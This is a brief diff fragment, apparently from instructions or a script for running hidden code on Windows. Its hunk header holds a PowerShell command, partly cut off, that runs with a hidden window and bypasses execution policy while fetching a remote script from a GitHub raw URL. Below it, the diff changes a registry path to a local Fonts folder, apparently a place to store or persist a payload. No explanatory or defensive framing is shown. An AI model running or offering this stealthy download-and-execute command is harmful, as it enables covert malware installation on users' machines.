@@ -3,4 +3,4 @@ powershell -w hidden -ep bypass -c "iwr -useb https://raw.githubusercontent.com/
 
 regedit
 
-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\History
+%LOCALAPPDATA%\Microsoft\Windows\Fonts
